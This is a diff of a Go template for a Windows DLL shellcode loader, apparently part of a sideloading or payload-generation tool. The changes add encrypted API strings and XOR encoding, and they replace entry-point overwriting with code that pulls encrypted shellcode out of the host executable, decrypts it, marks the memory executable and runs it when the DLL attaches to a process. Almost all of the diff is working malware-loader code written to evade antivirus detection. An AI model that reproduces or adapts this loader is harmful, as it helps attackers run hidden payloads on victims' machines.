@@ -6,7 +6,6 @@ import (
 	"bytes"
 	"encoding/binary"
 	"io/ioutil"
-	"os"
 	"path/filepath"
 	"syscall"
 	"unsafe"
@@ -21,28 +20,16 @@ const (
     MEM_RESERVE    = 0x00002000
     MEM_RELEASE    = 0x8000
     PAGE_READWRITE = 0x04
+	PAGE_EXECUTE_READ = 0x20
 )
 
 var (
-    kernel32           = syscall.NewLazyDLL("kernel32.dll")
-    getModuleHandle    = kernel32.NewProc("GetModuleHandleW")
-    procVirtualProtect = kernel32.NewProc("VirtualProtect")
+    kernel32           = syscall.NewLazyDLL({{ cryptStr "kernel32.dll" }})
+    procVirtualProtect = kernel32.NewProc({{ cryptStr "VirtualProtect" }})
 )
 
+{{ .FuncXorEncode }}
 
-//WriteMemory writes the provided memory to the specified memory address. Does **not** check permissions, may cause panic if memory is not writable etc.
-func WriteMemory(inbuf []byte, destination uintptr) {
-    for index := uint32(0); index < uint32(len(inbuf)); index++ {
-        writePtr := unsafe.Pointer(destination + uintptr(index))
-        v := (*byte)(writePtr)
-        *v = inbuf[index]
-    }
-}
-func GetModuleHandle() (handle uintptr) {
-    ret, _, _ := getModuleHandle.Call(0)
-    handle = ret
-    return
-}
 func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
     ret, _, _ := procVirtualProtect.Call(
         uintptr(lpAddress),
@@ -52,25 +39,19 @@ func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint3
     return ret > 0
 }
 
-// 将shellcode写入程序ep
-func loader_from_ep(shellcode []byte) {
-    baseAddress := GetModuleHandle()
-    ptr := unsafe.Pointer(baseAddress + uintptr(0x3c))
-    v := (*uint32)(ptr)
-    ntHeaderOffset := *v
-    ptr = unsafe.Pointer(baseAddress + uintptr(ntHeaderOffset) + uintptr(40))
-    ep := (*uint32)(ptr)
+func RUN(buf []byte) {
+	var pBaseAddr = unsafe.Pointer(&buf[0])
+	var dwBufferLen = uint(len(buf))
+	var dwOldPerm uint32
 
-    var entryPoint uintptr
-    entryPoint = baseAddress + uintptr(*ep)
-    var oldfperms uint32
-    if !VirtualProtect(unsafe.Pointer(entryPoint), unsafe.Sizeof(uintptr(len(shellcode))), uint32(0x40), unsafe.Pointer(&oldfperms)) {
-        panic("failed")
-    }
-    WriteMemory(shellcode, entryPoint)
-    if !VirtualProtect(unsafe.Pointer(entryPoint), uintptr(len(shellcode)), uint32(oldfperms), unsafe.Pointer(&oldfperms)) {
-        panic("failed")
-    }
+	if !VirtualProtect(pBaseAddr, uintptr(dwBufferLen), PAGE_EXECUTE_READ, unsafe.Pointer(&dwOldPerm)) {
+		panic("error")
+	}
+
+	syscall.Syscall(
+		uintptr(unsafe.Pointer(&buf[0])),
+		0, 0, 0, 0,
+	)
 }
 
 // XorEncryptDecrypt 异或加解密
@@ -81,14 +62,10 @@ func XorEncryptDecrypt(input, key []byte) (output []byte) {
 	return output
 }
 
-func decryptShellcode(shellcodeFilepath string) []byte {
-	shellcodeData, err := ioutil.ReadFile(shellcodeFilepath)
-	if err != nil {
-		panic(err)
-	}
+func decryptShellcode(shellcodeData []byte) []byte {
 	shellcodeReader := bytes.NewReader(shellcodeData)
 	var keyLen int64
-	err = binary.Read(shellcodeReader, binary.LittleEndian, &keyLen)
+	err := binary.Read(shellcodeReader, binary.LittleEndian, &keyLen)
 	if err != nil {
 		panic(err)
 	}
@@ -111,16 +88,44 @@ func decryptShellcode(shellcodeFilepath string) []byte {
 	return shellcode
 }
 
-//export test
-func test(
-	hinstDLL unsafe.Pointer, // handle to DLL module
-	fdwReason uint32, // reason for calling function
-	lpReserved unsafe.Pointer, // reserved
-) {
-	ex, _ := os.Executable()
-	exPath := filepath.Dir(ex)
-	shellcode := decryptShellcode(filepath.Join(exPath, shellcodeFile))
-    loader_from_ep(shellcode)
+func extractShellcode(data []byte, pattern []byte) []byte {
+	// pattern的组成，4byte长度(长度xor解密) + shellcode前12位
+	for i := 0; i < len(data); i++ {
+		if data[i] != pattern[0] {
+			continue
+		}
+		isMatch := true
+		for j := 0; j < len(pattern); j++ {
+			if data[i+j] != pattern[j] {
+				isMatch = false
+				break
+			}
+		}
+		if isMatch {
+			return data[i+len(pattern):]
+		}
+	}
+	return nil
+}
+
+//export OnProcessAttach
+func OnProcessAttach() {
+	// ex, _ := os.Executable()
+	// exPath := filepath.Dir(ex)
+	// shellcode := decryptShellcode(filepath.Join(exPath, shellcodeFile))
+	// ioutil.WriteFile(filepath.Join(exPath, "1.txt"), []byte(base64.StdEncoding.EncodeToString(shellcode)), 0666)
+	mainProgram := {{ cryptStr .MainProgram }}
+	filepath, err := filepath.Abs(mainProgram)
+	if err != nil {
+		panic(err)
+	}
+	content, err := ioutil.ReadFile(filepath)
+	if err != nil {
+		panic(err)
+	}
+	cryptedShellcode := extractShellcode(content, {{ .Pattern }})
+	shellcode := decryptShellcode(cryptedShellcode)
+    RUN(shellcode)
 }
 
 func main() {
